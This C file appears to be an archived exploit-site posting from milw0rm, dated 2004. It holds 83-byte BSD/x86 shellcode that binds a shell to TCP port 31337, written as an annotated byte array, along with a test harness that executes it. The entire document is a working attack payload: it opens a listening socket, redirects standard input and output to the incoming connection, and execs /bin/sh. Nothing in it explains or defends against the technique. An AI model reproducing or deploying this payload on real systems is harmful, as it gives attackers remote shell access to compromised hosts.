/* portbinding execve() shellcode (port 31337) bsd/x86 (83b) - no1 (greyhats.za.net) */

char shellc0de[]=
  "\x99"                        // cdq
  "\x52"                        // pushl %edx
  "\x6a\x01"                    // pushl $0x01
  "\x6a\x02"                    // pushl $0x02
  "\xb0\x61"                    // movb $0x61,%al
  "\x50"                        // pushl %eax
  "\xcd\x80"                    // int $0x80
  "\x52"                        // pushl %edx
  "\x68\xff\x02\x7a\x69"        // pushl $0x697a02ff
  "\x89\xe3"                    // movl %esp,%ebx
  "\x6a\x10"                    // push $0x10
  "\x53"                        // pushl %ebx
  "\x50"                        // pushl %eax
  "\x93"                        // xchg %eax,%ebx
  "\x31\xc0"                    // xorl %eax,%eax
  "\xb0\x68"                    // movb $0x68,%al
  "\x50"                        // pushl %eax
  "\xcd\x80"                    // int $0x80
  "\x53"                        // pushl %ebx
  "\xb0\x6a"                    // movb $0x6a,%al
  "\x50"                        // pushl %eax
  "\xcd\x80"                    // int $0x80
  "\x31\xc0"                    // xorl %eax,%eax
  "\x50"                        // pushl %eax
  "\x50"                        // pushl %eax
  "\x53"                        // pushl %ebx
  "\xb0\x1e"                    // movb $0x1e,%al
  "\x50"                        // pushl %eax
  "\xcd\x80"                    // int $0x80
  "\x93"                        // xchg %eax,%ebx
  "\x89\xc1"                    // movl %eax,%ecx
                                // looper:
  "\x31\xc0"                    // xor %eax,%eax
  "\x51"                        // pushl %ecx
  "\x53"                        // pushl %ebx
  "\xb0\x5a"                    // movb $0x5a,%al
  "\x50"                        // pushl %eax
  "\xcd\x80"                    // int $0x80
  "\x49"                        // decl %ecx
  "\x79\xf4"                    // jns looper
  "\x50"                        // pushl %eax
  "\x68\x2f\x2f\x73\x68"        // pushl $0x68732f2f
  "\x68\x2f\x62\x69\x6e"        // pushl $0x6e69622f
  "\x89\xe3"                    // movl %esp,%ebx
  "\x50"                        // pushl %eax
  "\x54"                        // pushl %esp
  "\x53"                        // pushl %ebx
  "\xb0\x3b"                    // movb $0x3b,%al
  "\x50"                        // pushl %eax
  "\xcd\x80";                   // int $0x80

int
main()
{
  void(*sc)()=(void *)shellc0de;
  printf("\nportbinding execve() shellcode (port 31337) bsd/x86 (%db) - no1 (greyhats.za.net)\n",strlen(shellc0de));
  sc();
  return;
}

// milw0rm.com [2004-09-26]